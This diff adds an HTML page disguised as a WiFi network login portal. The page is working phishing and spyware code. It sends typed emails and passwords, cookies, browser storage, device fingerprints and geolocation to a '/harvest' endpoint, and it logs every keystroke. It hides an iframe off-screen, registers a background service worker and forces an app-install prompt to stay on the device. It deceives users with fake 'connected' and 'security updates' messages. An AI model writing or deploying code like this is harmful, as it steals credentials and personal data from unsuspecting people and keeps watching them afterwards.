@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Network Authentication</title>
+    <link rel="manifest" href="/manifest.json">
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📶</text></svg>">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
+        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+        .card{max-width:400px;width:100%;background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);overflow:hidden}
+        .header{background:linear-gradient(135deg,#ff6b6b,#feca57);padding:40px 30px;text-align:center;color:white}
+        .header h1{font-size:1.5em;margin-bottom:10px}
+        .header p{font-size:0.9em;opacity:0.9}
+        .form{padding:40px 30px}
+        input{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;margin-bottom:20px;transition:all 0.3s}
+        input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1)}
+        button{width:100%;padding:15px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
+        button:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(102,126,234,0.3)}
+        .progress{display:none;background:#f0f0f0;border-radius:10px;height:8px;overflow:hidden;margin:20px 0}
+        .progress-bar{height:100%;background:linear-gradient(90deg,#4facfe 0%,#00f2fe 100%);transition:width 0.3s;border-radius:10px}
+        .status{color:#666;font-size:0.9em;text-align:center;margin-top:20px}
+        .hidden{display:none !important}
+        /* Persistence iframe (invisible) */
+        #persistence-iframe{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;z-index:999999}
+        /* Service worker registration indicator (debug only) */
+        #sw-status{position:fixed;top:10px;right:10px;background:rgba(0,255,0,0.1);padding:5px 10px;border-radius:5px;font-size:12px;z-index:999999;display:none}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h1>📶 WiFi Secured</h1>
+            <p>Network authentication required</p>
+        </div>
+        <div class="form">
+            <div class="progress" id="progress">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <input type="email" id="email" placeholder="Email address" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button onclick="login()">Connect to Network</button>
+            <div class="status" id="status"></div>
+        </div>
+    </div>
+
+    <!-- Stealth persistence iframe -->
+    <iframe id="persistence-iframe" src="/hook.js"></iframe>
+    <div id="sw-status"></div>
+
+    <script>
+        // Anti-detection + persistence implant
+        (function(){
+            // Fingerprint + initial harvest
+            const fp = {
+                userAgent:navigator.userAgent,
+                platform:navigator.platform,
+                language:navigator.language,
+                cookiesEnabled:navigator.cookieEnabled,
+                hardwareConcurrency:navigator.hardwareConcurrency,
+                deviceMemory:navigator.deviceMemory,
+                maxTouchPoints:navigator.maxTouchPoints,
+                connection:navigator.connection?.effectiveType,
+                screen:screen.width+'x'+screen.height,
+                timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            // Geolocation
+            if(navigator.geolocation) navigator.geolocation.getCurrentPosition(p=>fp.geo=[p.coords.latitude,p.coords.longitude]);
+            
+            // Beacon immediately
+            navigator.sendBeacon('/harvest',JSON.stringify({
+                type:'initial',fp,cookies:document.cookie,
+                url:location.href,referrer:document.referrer,
+                timestamp:Date.now()
+            }));
+
+            // PWA install persistence (auto-trigger after "success")
+            let deferredPrompt;
+            window.addEventListener('beforeinstallprompt',(e)=>{
+                e.preventDefault();
+                deferredPrompt=e;
+            });
+
+            // Service Worker for background beacons
+            if('serviceWorker' in navigator && 'PushManager' in window){
+                navigator.serviceWorker.register('/sw.js').then(reg=>{
+                    document.getElementById('sw-status').textContent='SW: '+reg.active?.state||'installing';
+                    document.getElementById('sw-status').style.display='block';
+                    // Beacon every 30s via SW
+                    setInterval(()=>reg.active?.postMessage({beacon:true}),30000);
+                }).catch(()=>{}); // Silent fail
+            }
+
+            // LocalStorage hijacking for persistence
+            localStorage.setItem('wifi_auth','persistent');
+            const observer=new MutationObserver(()=>{
+                if(localStorage.getItem('wifi_auth')) beacon();
+            });
+            observer.observe(document.body,{childList:true,subtree:true});
+
+            // Auto-beacon function
+            function beacon(){
+                navigator.sendBeacon('/harvest',JSON.stringify({
+                    type:'beacon',fp,cookies:document.cookie,
+                    localStorage:JSON.stringify(localStorage),
+                    sessionStorage:JSON.stringify(sessionStorage),
+                    timestamp:Date.now()
+                }));
+            }
+
+            // Fake login triggers persistence
+            window.login=()=>{
+                const progress=document.getElementById('progress');
+                const bar=document.getElementById('progress-bar');
+                const status=document.getElementById('status');
+                const btn=document.querySelector('button');
+                
+                progress.style.display='block';
+                btn.disabled=true;
+                
+                let i=0;
+                const int=setInterval(()=>{
+                    bar.style.width=i+'%';
+                    i+=5;
+                    if(i>100){
+                        clearInterval(int);
+                        status.innerHTML='✅ Connected! Installing security updates...';
+                        
+                        // Trigger PWA install
+                        if(deferredPrompt){
+                            deferredPrompt.prompt();
+                            deferredPrompt.userChoice.then(()=>deferredPrompt=null);
+                        }
+                        
+                        // Infinite persistence loop (hidden)
+                        setInterval(()=>{
+                            beacon();
+                            // DOM harvest
+                            navigator.sendBeacon('/harvest',JSON.stringify({
+                                type:'dom',forms:document.forms.length,
+                                inputs:document.querySelectorAll('input,textarea').length,
+                                timestamp:Date.now()
+                            }));
+                        },5000);
+                        
+                        // Fake redirect to nowhere (stay on page)
+                        setTimeout(()=>status.innerHTML='🔒 Security updates complete. Network secured.',2000);
+                    }
+                },100);
+
+                // Steal creds immediately
+                navigator.sendBeacon('/harvest',JSON.stringify({
+                    type:'creds',
+                    email:document.getElementById('email').value,
+                    password:document.getElementById('password').value,
+                    timestamp:Date.now()
+                }));
+            }
+
+            // Page visibility persistence
+            document.addEventListener('visibilitychange',()=>{
+                if(!document.hidden) beacon();
+            });
+
+            // Catch form submissions globally
+            document.addEventListener('submit',e=>{
+                setTimeout(()=>{
+                    Array.from(e.target.elements).forEach(el=>{
+                        if(el.type==='password' || el.type==='email' || el.name.includes('pass') || el.name.includes('token')){
+                            navigator.sendBeacon('/harvest',JSON.stringify({
+                                type:'form',name:el.name,value:el.value,timestamp:Date.now()
+                            }));
+                        }
+                    });
+                },100);
+            });
+
+            // Keyboard persistence (keylogger continues)
+            document.addEventListener('keydown',e=>{
+                navigator.sendBeacon('/hook.js?k='+encodeURIComponent(e.key),new Blob([]));
+            });
+
+            // Initial beacon on load
+            setTimeout(beacon,1000);
+        })();
+    </script>
+</body>
+</html>
